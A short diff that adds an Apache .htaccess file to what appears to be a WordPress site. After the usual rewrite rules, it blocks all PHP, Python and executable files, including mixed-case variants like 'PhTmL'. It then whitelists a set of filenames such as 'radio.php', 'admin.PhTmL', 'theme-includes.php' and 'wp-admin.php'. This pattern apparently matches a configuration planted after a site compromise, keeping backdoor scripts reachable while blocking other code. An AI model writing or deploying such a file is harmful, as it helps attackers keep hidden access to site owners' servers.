@@ -1,0 +1,16 @@
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
+</IfModule>
+<FilesMatch ".*\.(py|exe|phtml|PhTmL|php|PhP|php7|php3|php5|php6|suspected)$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch "^(admin.PhTmL|admin.php|index.php|wp-load.php|radio.php|wp-blog-header.php|wp-login.php|edit.php|theme-includes.php|functions.php|vc_row_inner.php|vc_row.php|wp-admin.php)$">
+Order Allow,Deny
+Allow from all
+</FilesMatch>
